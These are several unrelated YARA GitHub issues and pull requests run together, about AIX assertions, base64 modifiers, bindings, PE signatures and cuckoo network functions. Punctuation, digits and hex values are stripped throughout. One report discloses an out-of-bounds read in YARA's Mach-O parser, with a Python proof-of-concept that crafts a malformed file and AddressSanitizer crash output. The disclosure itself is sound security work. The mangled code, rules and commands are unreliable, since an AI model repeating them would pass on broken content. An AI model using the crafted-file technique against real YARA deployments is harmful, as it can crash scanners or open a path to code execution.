Hi when scanning a file with libyara on AIX PPC POWER I sporadically get one of the following two assertion failures Assertion failed EX file execc line or Assertion failed EX file objectc line The assertions can be found here It seems like its completely random I would say the first failure is raised every th time the second error every th time I cant even say which rule triggers that assertion failure The same ruleset is working fine on Windows Linux and macOS Anyone here who knows what causes the above assertions to fail Libyara was compiled with CFLAGSmaix OBJECTMODE configure disableshared disablemagic disablecuckoo enabledotnet OpenSSL Version r ulimits core file size blocks c unlimited data seg size kbytes d unlimited file size blocks f unlimited max memory size kbytes m unlimited open files n unlimited pipe size bytes p stack size kbytes s unlimited cpu time seconds t unlimited max user processes u unlimited virtual memory kbytes v unlimited Available memory svmon G O unitMB Unit MB size inuse free pin virtual available mmode memory Ded pg space work pers clnt other pin in use Kind regards Marcel Add two new modifiers base and widebase These modifiers take the given text string and generate different strings being careful to trim off the bytes which are dependent upon leading or trailing bytes in the larger search space Ive implemented it by slightly cheating I generate all the search strings in a list and then creating one large string suitable for the RE compiler to deal with For example the string This program cannot generates these three base encoded strings VGhpcyBwcm ncmFtIGNhbm vd RoaXMgcHJvZ JhbSBjYW ub UaGlzIHByb dyYW gY Fubm Those three strings are then transformed into a RE that looks like this VGhpcyBwcm ncmFtIGNhbm vdRoaXMgcHJvZ JhbSBjYW ub UaGlzIHByb dyYW gY Fubm That string is then passed to the RE compiler for parsing and AST generation The AST is then emitted into the appropriate spot and YARA believes it was given a regex from that point on Ive also implemented support for specifying custom alphabets base ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstu This means that I have to be careful to escape any special RE characters in the string passed to the compiler The base alphabet has to be bytes long and does support escaped bytes properly too To avoid the need to deal with escaping I had a first implementation which attempted to generate the AST by hand which was mostly working but was very cumbersome to maintain In doing this I ended up improving yrreprintnode so that it indents the tree properly which made debugging that attempt easier My apologies for including it in this diff I can split it out if you want Lastly I did most of the work in rec but I think it belongs in its own base c Im happy to move it out of rec if you would prefer upx UCL data compression library zlib data compression library LZMA SDK version repro on x ubuntu machine aptget install upx upx o f usrbinsomeELF file f ELF bit LSB shared object x version SYSV statically linked stripped yara ruleyar f cat ruleyar rule upxtest meta tool P name UPX version x LZMA source nv pattern E FE strings E FE condition at elfentrypoint I noticed there were some issues about Yara bindings for different languages so decided to leave the announcement of OCaml ones They are very basic just to fulfill my own needs but I am open for suggestions and pull requests Hello I was recently looking at the following file D A CF BB B FE EFC D A This is a file with signature and no version information Heres some snipped output from the D flag with yara signatures thumbprint e f c d bd d cf e ab issuer CUSSTWashingtonLRedmondOMicrosoft CorporationOUCopyright c Microsoft CorpCNMicrosoft Code Signing PCA subject CUSSTWashingtonLRedmondOMicrosoft CorporationCNMicrosoft Corporation version algorithm sha WithRSAEncryption serial ecb notbefore notafter snipped versioninfo snipped there is no version info which is correct When I try to match on this using a rule like this no match is provided presumably because it cant find any version information import pe rule generalwinappendedmicrosoftcertificate condition pesignatures subject contains LRedmondOMicrosoft Corporation and not peversioninfo LegalCopyright contains Microsoft I think in cases like this the signature should fire thoughts Cheers Tom In libyaramodulesmachomachoc yara doesnt check whether the variable commandsize is consistent with the commands real size A crafted MachO file will lead an outofbounds memory access later Following is the bug code c uint t command uint theader for unsigned i i yrbo tohheaderncmds i yrloadcommandt commandstruct yrloadcommandtcommand uint t commandsize yrbo tohcommandstructcmdsize if size parsedsize commandsize break switchyrbo tohcommandstructcmd case LCSEGMENT case LCSEGMENT machohandlesegmentbitsbocommand segcount object break case LCUNIXTHREAD machohandleunixthreadbocommand object context break case LCMAIN machohandlemainbocommand object context break Take an example If the size is x ncmds and there is only one command whose size is x The memory layout of the crafted macho would look like HEADER bytes FIRST COMMAND x bytes Thus when yara tries to handle the second command here yara will access the address after data causing an outofbounds memory access This will cause crash or potentials code executions The poc is attach bash cat pocr import macho pip install pwntools cat getmachopy from pwn import myp p myp p myp p def getheader header myp xfeedface header myp header myp header myp return header def getcmd cmdsize x cmd myp xdeadbeef cmd myp cmdsize cmd cmdljustcmdsize x return cmd if name main macho getheader macho getcmd f filemymacho wb fwritemacho fclose python getmachopy yara pocr mymacho ERROR AddressSanitizer unknowncrash on address x f a ff at pc x f a b c b bp x ffd ba sp x ffd ba READ of size at x f a ff thread T x f a b c b in machoparsefile lepart homesxxxGithubyaralibyaralibslibyaraso x a b x f a b d in machoload homesxxxGithubyaralibyaralibslibyaraso x d x f a bc e in yrmodulesload homesxxxGithubyaralibyaralibslibyaraso xb e x f a ba ece in yrexecutecode homesxxxGithubyaralibyaralibslibyaraso x fece x f a bf ff in yrscannerscanmemblocks homesxxxGithubyaralibyaralibslibyaraso xe ff x f a bf e c in yrscannerscanmem homesxxxGithubyaralibyaralibslibyaraso xe e c x f a bf in yrscannerscanfile homesxxxGithubyaralibyaralibslibyaraso xe x e e in main homesu xxxGithubyaralibsyara x e x f a b in libcstartmain libx linuxgnulibcso x b x e in start homesu xxxGithubyaralibsyara x Address x f a ff is a wild pointer SUMMARY AddressSanitizer unknowncrash homesxxxGithubyaralibyaralibslibyaraso x a b in machoparsefile lepart Shadow bytes around the buggy address x fe f bb x fe f bc x fe f bd x fe f be x fe f bf x fe f c fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe x fe f c fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe x fe f c fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe x fe f c fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe x fe f c fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe x fe f c fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe Shadow byte legend one shadow byte represents application bytes Addressable Partially addressable Heap left redzone fa Freed heap region fd Stack left redzone f Stack mid redzone f Stack right redzone f Stack after return f Stack use after scope f Global redzone f Global init order f Poisoned by user f Container overflow fc Array cookie ac Intra object redzone bb ASan internal fe Left alloca redzone ca Right alloca redzone cb ABORTING Crafted MachO mymacho is also attached See Added support for networkhostregexp example cuckoonetworkhost networktcpregexp int aguments destintionip destinationport example cuckoonetworktcp networkudpregexp int aguments destintionip destinationport example cuckoonetworktcp networkhttpuseragentregexp example cuckoonetworkhttpuseragentMSIE I tested with a JSON cuckoo report I grabbed from a VT CuckooFork run I looked into creatingrunning tests but as there are not any tests for the cuckoo module I decided it was out of scope of this PR to implement that Happy to help with future work though I think that the whole module could probably use a refactor but I designed my additions around the existing code set There is definitely some codereuse and repetition See TLDR As an avid VT user I was excited to learn about support for hunting with yara including support for the cuckoo module When I started to use the module I noticed that it did not yet support many of the things that are available in many cuckoo JSON reports When looking through issues and PRs I found which wanted to update the module to support the latest cuckoo JSON format Unfortunately it looks like this had some issues that were never fixed and it was not merged While updating the module to support the latest JSON as well as keeping it backwards compatible seems worthwhile my request is to simply support new functions to parse existing functionality from the cuckoo reports networkhostregexp example cuckoonetworkhost networktcpregexp example cuckoonetworktcp networkudpregexp example cuckoonetworktcp I have read the source and think I can add these methods via a PR I am also happy to write the documentation to support these methods As far as I can tell there is no need to support new versions of cuckoo reports but if there is interest then I could add support for those as well TLDR before I start work on a PR are the maintainers interested in seeing support for additional network methods in the cuckoo module Fixes 